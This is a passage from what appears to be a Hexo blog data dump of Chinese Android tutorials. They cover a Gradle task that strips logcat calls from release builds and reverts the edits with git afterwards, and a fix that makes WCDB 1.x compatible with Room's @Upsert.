class=\"keyword\">if</span> (isAssembleRelease &amp;&amp; toggle) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 做一些release编译才做的事</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>接下来，我们开始自定义task，去除release版本中的logcat日志打印：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tasks &#123;</span><br><span class=\"line\">    <span class=\"keyword\">val</span> removeLogs <span class=\"keyword\">by</span> registering &#123;</span><br><span class=\"line\">        group = <span class=\"string\">&quot;你可以随意定义分组名字，方便在Gradle任务列表中快速查找&quot;</span></span><br><span class=\"line\">        doLast &#123;</span><br><span class=\"line\">            <span class=\"keyword\">val</span> srcDir = File(project.rootDir, <span class=\"string\">&quot;app/src/main/java&quot;</span>)</span><br><span class=\"line\">            srcDir.walkTopDown().filter &#123;</span><br><span class=\"line\">                it.isFile &amp;&amp; it.extension == <span class=\"string\">&quot;kt&quot;</span></span><br><span class=\"line\">            &#125;.forEach &#123;</span><br><span class=\"line\">                <span class=\"keyword\">val</span> content = it.readText()</span><br><span class=\"line\">                it.writeText(</span><br><span class=\"line\">                    content.replace(<span class=\"string\">&quot;import android.util.Log&quot;</span>, <span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">                        .replace(<span class=\"string\">&quot;Log.&quot;</span>, <span class=\"string\">&quot;// Log.&quot;</span>)</span><br><span class=\"line\">                )</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个任务只是个例子，很简单，目的就是搜寻源码目录下所有的kt文件，然后把logcat相关的代码注释掉。这样可以有效防止被反编译后泄露敏感字符串，当然你可以根据自己的需求随意去修改文件内容。</p>\n<p>自定义之后，就是最后一步了，把任务插入添加到Gradle的编译任务链中，主要使用 <code>dependsOn</code> 方法，让preBuild任务依赖于我们的自定义任务：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tasks &#123;</span><br><span class=\"line\">    <span class=\"keyword\">val</span> removeLogs <span class=\"keyword\">by</span> registering &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    preBuild &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (isAssembleRelease &amp;&amp; toggle) &#123;</span><br><span class=\"line\">            dependsOn(<span class=\"string\">&quot;removeLogs&quot;</span>)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>dependsOn</code> 方法还接受多个参数，比如上述若改成 <code>dependsOn(&quot;task1&quot;, &quot;task2&quot;, &quot;task3&quot;)</code>，那么在preBuild之前就将按序依次执行这3个task。 </p>\n<p>记得进行Gradle Sync操作，再启动assembleRelease编译，就可以在构建输出中看到我们自定义的任务了：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Executing tasks: [:app:assembleRelease] in project /Users/xxx/xxx/xxx</span><br><span class=\"line\"></span><br><span class=\"line\">Starting Gradle Daemon...</span><br><span class=\"line\">Gradle Daemon started in 1 s 244 ms</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; Configure project :app</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; Task :app:createReleaseVariantModel UP-TO-DATE</span><br><span class=\"line\">&gt; Task :app:removeLogs</span><br><span class=\"line\">&gt; Task :app:preBuild</span><br><span class=\"line\">&gt; Task :app:preReleaseBuild</span><br></pre></td></tr></table></figure>\n\n<p>可以看到，createReleaseVariantModel这个预定义的任务其实就是在动态生成assembleRelease，然后removeLogs在preBuild的前面，这样就能保证在代码优化和混淆开始之前，对源码进行自定义修改。</p>\n<h3 id=\"补充\"><a href=\"#补充\" class=\"headerlink\" title=\"补充\"></a>补充</h3><p>对于大多数项目来说，都是有git管理的，所以在我们刚才对源码进行修改之后，其实并不想提交这些修改，而是想在编译完成后撤销修改。那么，我们就可以继续优化上述代码，在assembleRelease完成之后执行简单的git命令：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tasks &#123;</span><br><span class=\"line\">    <span class=\"keyword\">val</span> removeLogs <span class=\"keyword\">by</span> registering &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 我们可以写一个方法，方便复用</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">execGitRollbackAndCleanSrc</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">        exec &#123; commandLine(<span class=\"string\">&quot;git&quot;</span>, <span class=\"string\">&quot;checkout&quot;</span>, <span class=\"string\">&quot;src&quot;</span>) &#125;</span><br><span class=\"line\">        exec &#123; commandLine(<span class=\"string\">&quot;git&quot;</span>, <span class=\"string\">&quot;clean&quot;</span>, <span class=\"string\">&quot;-fd&quot;</span>, <span class=\"string\">&quot;src&quot;</span>) &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    preBuild &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (isAssembleRelease &amp;&amp; toggle) &#123;</span><br><span class=\"line\">            dependsOn(<span class=\"string\">&quot;removeLogs&quot;</span>)</span><br><span class=\"line\">            doLast &#123;</span><br><span class=\"line\">                findByName(<span class=\"string\">&quot;bundleRelease&quot;</span>)?.doLast &#123; execGitRollbackAndCleanSrc() &#125;</span><br><span class=\"line\">                findByName(<span class=\"string\">&quot;assembleRelease&quot;</span>)?.doLast &#123; execGitRollbackAndCleanSrc() &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>和 <code>dependsOn</code> 类似，<code>doLast</code> 也是调整任务链的有效方法之一，即在preBuild执行完成时，动态地给assembleRelease添加一个任务，使得assembleRelease在执行完成时，再执行我们的方法。</p>\n<h3 id=\"后话\"><a href=\"#后话\" class=\"headerlink\" title=\"后话\"></a>后话</h3><p>上述代码都是一些简单的Gradle脚本，专用于自己项目的一些编译优化，进行大量实践后，完全可以开发成Gradle插件来使用，关键代码都是差不多的，需要的只是熟读Gradle官方文档，了解整个编译构建流程。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h3 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h3><p>在实际的Gradle项目开发中，我们总是会遇到一些需求，要在release编译的时候执行一些任务，但debug时不需要。然而，Gradle编译有自己的一套生命周期，比如Android项目的assembleRelease任务在编译启动之前是没有办法静态获取到的。</p>\n<p>下面我们就以“去除release版本中的logcat日志打印”为例，做一个简单的梳理。</p>\n<h3 id=\"源码\"><a href=\"#源码\" class=\"headerlink\" title=\"源码\"></a>源码</h3><p>修改模板（module）级别的 <code>build.gradle.kts</code> 文件，我们初步目标是在编译刚启动但还没实际开始执行任务时插入我们的自定义任务，切入点就是Gradle的preBuild任务，这个是预定义的，所以可以进行静态配置：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">plugins &#123;</span><br><span class=\"line\">    id(<span class=\"string\">&quot;com.android.application&quot;</span>)</span><br><span class=\"line\">    id(<span class=\"string\">&quot;kotlin-android&quot;</span>)</span><br><span class=\"line\">    id(<span class=\"string\">&quot;kotlin-kapt&quot;</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">android &#123;</span><br><span class=\"line\">    namespace = <span class=\"string\">&quot;com.xxx.yyy&quot;</span></span><br><span class=\"line\">    compileSdk = <span class=\"number\">34</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">dependencies &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 重点部分</span></span><br><span class=\"line\">tasks &#123;</span><br><span class=\"line\">    preBuild &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 编译启动后，相关任务会动态生成，于是可以获取到</span></span><br><span class=\"line\">        <span class=\"keyword\">val</span> isAssembleRelease = gradle.startParameter.taskNames.any &#123;</span><br><span class=\"line\">            it.contains(<span class=\"string\">&quot;assembleRelease&quot;</span>)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (isAssembleRelease) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 做一些release编译才做的事</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>以上可以说就是一个基础模板代码。此外，我们还可以添加本地配置来控制编译任务的开关，在项目（project）级别目录下添加 <code>local.properties</code> 文件，注意这个文件不要添加到git索引中，只是一个本地文件，一般来说项目拉取到本地的时候IDE（如Android Studio）会自动生成此文件：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">## This file must *NOT* be checked into Version Control Systems,</span><br><span class=\"line\"># as it contains information specific to your local configuration.</span><br><span class=\"line\">#</span><br><span class=\"line\"># Location of the SDK. This is only used by Gradle.</span><br><span class=\"line\"># For customization when using a Version Control System, please read the</span><br><span class=\"line\"># header note.</span><br><span class=\"line\">#Wed Oct 25 11:29:50 CST 2023</span><br><span class=\"line\">sdk.dir=/Users/xxx/Library/Android/sdk</span><br><span class=\"line\"></span><br><span class=\"line\"># 增加一个自定义的属性，等会儿使用</span><br><span class=\"line\">BUILD_FOR_RELEASE=true</span><br></pre></td></tr></table></figure>\n\n<p>回去修改模板代码，这样就可以在不需要的时候，关闭自定义任务的执行：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// kts文件头部需要import此类</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Properties</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\"></span><br><span class=\"line\">tasks &#123;</span><br><span class=\"line\">    preBuild &#123;</span><br><span class=\"line\">        <span class=\"keyword\">val</span> isAssembleRelease = gradle.startParameter.taskNames.any &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 把app bundle编译也考虑进去</span></span><br><span class=\"line\">            it.contains(<span class=\"string\">&quot;bundleRelease&quot;</span>) || it.contains(<span class=\"string\">&quot;assembleRelease&quot;</span>)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">val</span> localPropsFile = File(project.rootDir, <span class=\"string\">&quot;local.properties&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">val</span> localProps = localPropsFile.takeIf &#123; it.exists() &#125;?.let &#123;</span><br><span class=\"line\">            Properties().apply &#123; localPropsFile.inputStream().use &#123; input -&gt; load(input) &#125; &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">val</span> toggle = localProps?.getProperty(<span class=\"string\">&quot;BUILD_FOR_RELEASE&quot;</span>)?.toBoolean() ?: <span class=\"literal\">true</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (isAssembleRelease &amp;&amp; toggle) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 做一些release编译才做的事</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>接下来，我们开始自定义task，去除release版本中的logcat日志打印：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tasks &#123;</span><br><span class=\"line\">    <span class=\"keyword\">val</span> removeLogs <span class=\"keyword\">by</span> registering &#123;</span><br><span class=\"line\">        group = <span class=\"string\">&quot;你可以随意定义分组名字，方便在Gradle任务列表中快速查找&quot;</span></span><br><span class=\"line\">        doLast &#123;</span><br><span class=\"line\">            <span class=\"keyword\">val</span> srcDir = File(project.rootDir, <span class=\"string\">&quot;app/src/main/java&quot;</span>)</span><br><span class=\"line\">            srcDir.walkTopDown().filter &#123;</span><br><span class=\"line\">                it.isFile &amp;&amp; it.extension == <span class=\"string\">&quot;kt&quot;</span></span><br><span class=\"line\">            &#125;.forEach &#123;</span><br><span class=\"line\">                <span class=\"keyword\">val</span> content = it.readText()</span><br><span class=\"line\">                it.writeText(</span><br><span class=\"line\">                    content.replace(<span class=\"string\">&quot;import android.util.Log&quot;</span>, <span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">                        .replace(<span class=\"string\">&quot;Log.&quot;</span>, <span class=\"string\">&quot;// Log.&quot;</span>)</span><br><span class=\"line\">                )</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个任务只是个例子，很简单，目的就是搜寻源码目录下所有的kt文件，然后把logcat相关的代码注释掉。这样可以有效防止被反编译后泄露敏感字符串，当然你可以根据自己的需求随意去修改文件内容。</p>\n<p>自定义之后，就是最后一步了，把任务插入添加到Gradle的编译任务链中，主要使用 <code>dependsOn</code> 方法，让preBuild任务依赖于我们的自定义任务：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tasks &#123;</span><br><span class=\"line\">    <span class=\"keyword\">val</span> removeLogs <span class=\"keyword\">by</span> registering &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    preBuild &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (isAssembleRelease &amp;&amp; toggle) &#123;</span><br><span class=\"line\">            dependsOn(<span class=\"string\">&quot;removeLogs&quot;</span>)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>dependsOn</code> 方法还接受多个参数，比如上述若改成 <code>dependsOn(&quot;task1&quot;, &quot;task2&quot;, &quot;task3&quot;)</code>，那么在preBuild之前就将按序依次执行这3个task。 </p>\n<p>记得进行Gradle Sync操作，再启动assembleRelease编译，就可以在构建输出中看到我们自定义的任务了：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Executing tasks: [:app:assembleRelease] in project /Users/xxx/xxx/xxx</span><br><span class=\"line\"></span><br><span class=\"line\">Starting Gradle Daemon...</span><br><span class=\"line\">Gradle Daemon started in 1 s 244 ms</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; Configure project :app</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; Task :app:createReleaseVariantModel UP-TO-DATE</span><br><span class=\"line\">&gt; Task :app:removeLogs</span><br><span class=\"line\">&gt; Task :app:preBuild</span><br><span class=\"line\">&gt; Task :app:preReleaseBuild</span><br></pre></td></tr></table></figure>\n\n<p>可以看到，createReleaseVariantModel这个预定义的任务其实就是在动态生成assembleRelease，然后removeLogs在preBuild的前面，这样就能保证在代码优化和混淆开始之前，对源码进行自定义修改。</p>\n<h3 id=\"补充\"><a href=\"#补充\" class=\"headerlink\" title=\"补充\"></a>补充</h3><p>对于大多数项目来说，都是有git管理的，所以在我们刚才对源码进行修改之后，其实并不想提交这些修改，而是想在编译完成后撤销修改。那么，我们就可以继续优化上述代码，在assembleRelease完成之后执行简单的git命令：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tasks &#123;</span><br><span class=\"line\">    <span class=\"keyword\">val</span> removeLogs <span class=\"keyword\">by</span> registering &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 我们可以写一个方法，方便复用</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">execGitRollbackAndCleanSrc</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">        exec &#123; commandLine(<span class=\"string\">&quot;git&quot;</span>, <span class=\"string\">&quot;checkout&quot;</span>, <span class=\"string\">&quot;src&quot;</span>) &#125;</span><br><span class=\"line\">        exec &#123; commandLine(<span class=\"string\">&quot;git&quot;</span>, <span class=\"string\">&quot;clean&quot;</span>, <span class=\"string\">&quot;-fd&quot;</span>, <span class=\"string\">&quot;src&quot;</span>) &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    preBuild &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (isAssembleRelease &amp;&amp; toggle) &#123;</span><br><span class=\"line\">            dependsOn(<span class=\"string\">&quot;removeLogs&quot;</span>)</span><br><span class=\"line\">            doLast &#123;</span><br><span class=\"line\">                findByName(<span class=\"string\">&quot;bundleRelease&quot;</span>)?.doLast &#123; execGitRollbackAndCleanSrc() &#125;</span><br><span class=\"line\">                findByName(<span class=\"string\">&quot;assembleRelease&quot;</span>)?.doLast &#123; execGitRollbackAndCleanSrc() &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>和 <code>dependsOn</code> 类似，<code>doLast</code> 也是调整任务链的有效方法之一，即在preBuild执行完成时，动态地给assembleRelease添加一个任务，使得assembleRelease在执行完成时，再执行我们的方法。</p>\n<h3 id=\"后话\"><a href=\"#后话\" class=\"headerlink\" title=\"后话\"></a>后话</h3><p>上述代码都是一些简单的Gradle脚本，专用于自己项目的一些编译优化，进行大量实践后，完全可以开发成Gradle插件来使用，关键代码都是差不多的，需要的只是熟读Gradle官方文档，了解整个编译构建流程。</p>\n"},{"title":"让WCDB兼容最新版Room","date":"2024-03-28T02:17:23.000Z","_content":"\n> 先直接推荐我的开源小库：[WCDBRoomX](https://github.com/ysy950803/WCDBRoomX) ，如果它的README就已经让你知道库的核心作用，这篇文章就不需要看了。\n\nWCDB是腾讯微信团队开源的客户端数据库框架，拥有高性能和支持加密等重要特性，并且可用于Android、iOS、Windows、macOS等多个平台。 我们知道，原生的加密数据库框架SQLCipher和不加密的SQLite相比，性能差距还是很大的，加密会使得读写效率严重下降，而WCDB很好地兼顾了性能和安全问题。\n\n- [SQLCipher和SQLite对比测试](https://github.com/ysy950803/SQLCipherPerformance)\n- [WCDB和SQLite对比测试](https://cloud.tencent.com/developer/article/1904561)\n\n对使用了Google官方Jetpack Room库的开发者，WCDB 1.x版本也提供了完美支持：[Use WCDB with Room](https://github.com/Tencent/wcdb/tree/room#use-wcdb-with-room) ，然而，WCDB 2.x版本后变成了一个纯ORM框架，虽然也支持Java、Kotlin等语言（本质上就是一层封装，底层接口都一样），但是暂时没有计划支持兼容Room，从官方文档看，2.x版本更纯粹，一套代码跨全平台，所以也不关注各平台的其他框架兼容了。\n\n> 跟WCDB的开发者也聊了聊，他们团队对Room的支持兴趣不大：[issues#1052](https://github.com/Tencent/wcdb/issues/1052) 。其实浏览一下2.x版本的更新日志，看似开发团队是iOS研发主导，很多更新也和Android无关。\n\n不过问题不大，1.x版本的性能和稳定性已经非常好，连微信客户端自己都用了好多年。唯一的一个小问题是，Room最新版本支持了 [@Upsert](https://developer.android.com/reference/kotlin/androidx/room/Upsert) 注解，如果还继续使用 `com.tencent.wcdb:room:1.x` 库的话，在插入数据时没问题，但在更新数据时会崩溃，抛出异常：`SQLiteConstraintException` 。\n\n**解决方案有两种：**\n\n- 摆烂，不再使用Room的Upsert注解，把Upsert拆成Insert和Update，这样需要改动很多现有代码。\n- Read the fucking code，看看为什么崩溃。\n\n如果你选择第一种方案，后面就不用看了，但是为什么不看看第二种方案呢？/狗头\n\n其实Upsert的实现很简单，最终执行插入或更新操作的源码在 [EntityUpsertAdapter](https://android.googlesource.com/platform/frameworks/support/+/refs/heads/androidx-main/room/room-runtime/src/commonMain/kotlin/androidx/room/EntityUpsertAdapter.kt) ：\n\n```kotlin\n    /**\n     * Upserts the given entities into the database and returns the row ids.\n     *\n     * @param entities Entities to upsert\n     * @return The SQLite row ids, for entities that are not inserted the row id returned will be -1\n     */\n    fun upsertAndReturnIdsArray(entities: Array<out T>): LongArray {\n        return LongArray(entities.size) { index ->\n            try {\n                insertionAdapter.insertAndReturnId(entities[index])\n            } catch (ex: SQLiteConstraintException) {\n                checkUniquenessException(ex)\n                updateAdapter.handle(entities[index])\n                -1\n            }\n        }\n    }\n```\n\n可以看出，每次Upsert操作都会先进行插入，如果数据已经存在，会抛异常，在catch捕获异常后，再进行更新数据的操作。所以理论上Room是可以捕获异常的，为什么集成WCDB之后就捕获不到了呢？\n\n原因是WCDB对SQLite的很多类都重新进行了封装，一些基本的代码虽然没有改动，但是包名却变成了 `com.tencent.wcdb.database` ：\n\n```java\npackage com.tencent.wcdb.database;\n\n/**\n * An exception that indicates that an integrity constraint was violated.\n */\n@SuppressWarnings(\"serial\")\npublic class SQLiteConstraintException extends SQLiteException {\n    public SQLiteConstraintException() {}\n\n    public SQLiteConstraintException(String error) {\n        super(error);\n    }\n}\n```\n\n而Room只能捕获原生的 `android.database.sqlite` 包下的异常。知道原因后，这就好改了，只需要改造 `WCDBStatement` 即可：\n\n```java\nimport com.tencent.wcdb.database.SQLiteConstraintException;\n// ...\n\nclass WCDBStatement implements SupportSQLiteStatement {\n    // ...\n\n    @Override\n    public long executeInsert() {\n        try {\n            return mDelegate.executeInsert();\n        } catch (SQLiteConstraintException ex) {\n            // 兼容新版Room的Upsert注解\n            throw new android.database.sqlite.SQLiteConstraintException(ex.getMessage());\n        }\n    }\n}\n```\n\n捕获WCDB自定义的异常后，转换一次，抛出原生SQLite库的异常，这样就能被Room的EntityUpsertAdapter捕获到，顺利兼容Upsert操作。\n\n**当然，** 我已经把这些兼容处理好了，并且迁移了相关的依赖库为AndroidX，同时集成最新版本的SQLCipher，才有了：[WCDBRoomX](https://github.com/ysy950803/WCDBRoomX)\n\n可以删掉所有WCDB、SQLCipher、SQLite相关的依赖，直接引入WCDBRoomX即可：\n\n```kotlin\ndependencies { \n//    implementation(\"androidx.sqlite:sqlite-ktx:2.4.0\")\n//    implementation(\"net.zetetic:sqlcipher-android:4.5.6@aar\")\n//    implementation(\"com.tencent.wcdb:wcdb-android:1.1-19\")\n    implementation(\"com.github.ysy950803:WCDBRoomX:1.0.0\")\n\n    // 当然，Room还是要保留的，方便独立更新，WCDBRoomX为了轻便，不会包含Room\n    val roomVersion = \"2.6.1\"\n    kapt(\"androidx.room:room-compiler:$roomVersion\")\n    implementation(\"androidx.room:room-ktx:$roomVersion\")\n}\n```\n\n快速集成：\n\n```kotlin\nRoom.databaseBuilder(...)\n    .openHelperFactory(WCDBRoomX.createOpenHelperFactory(\"db_password\"))\n    .build()\n```\n","source":"_posts/2024-03-28-让WCDB兼容最新版Room.md","raw":"---\ntitle: 让WCDB兼容最新版Room\ndate: 2024-03-28 10:17:23\ntags:\n  - Android\n  - 